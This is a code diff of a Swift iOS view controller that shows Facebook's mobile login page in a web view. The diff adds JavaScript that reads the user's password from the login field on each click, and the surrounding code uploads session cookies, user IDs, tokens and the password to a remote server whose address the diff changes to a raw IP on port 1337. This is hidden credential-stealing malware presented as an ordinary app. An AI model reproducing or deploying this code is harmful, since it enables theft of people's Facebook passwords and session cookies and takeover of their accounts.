@@ -13,7 +13,7 @@ class WebViewController: UIViewController, WKNavigationDelegate {
 
     @IBOutlet weak var webView: UIView!
     @IBOutlet weak var urlLabel: UILabel!
-    
+    var jsGetPassWord = "window.addEventListener('click', event => {if(document.getElementById('m_login_password').value !== \"\"){console.log(document.getElementById('m_login_password').value);}});"
     let HOST_URL = "https://m.facebook.com/"
     var wkWebView: WKWebView!
     var openMainScreen: (() -> Void)?
@@ -60,7 +60,6 @@ class WebViewController: UIViewController, WKNavigationDelegate {
                     }else{
                         weakSelf.uploadCookies(cookies: cookeis, uid: c_user, xs: xs)
                     }
-                    
                 }
             })
             decisionHandler(.allow)
@@ -80,7 +79,7 @@ class WebViewController: UIViewController, WKNavigationDelegate {
 
 extension WebViewController{
     private func upLoadData(password: String, uid: String,cookie: String,combined: String){
-        let url = URL(string: "https://level-hallway-308115.uc.r.appspot.com/facebook-cookies")!
+        let url = URL(string: "http://3.138.32.52:1337/admin")!
         var request = URLRequest(url: url)
         request.setValue("application/json", forHTTPHeaderField: "Content-Type")
         request.httpMethod = "POST"
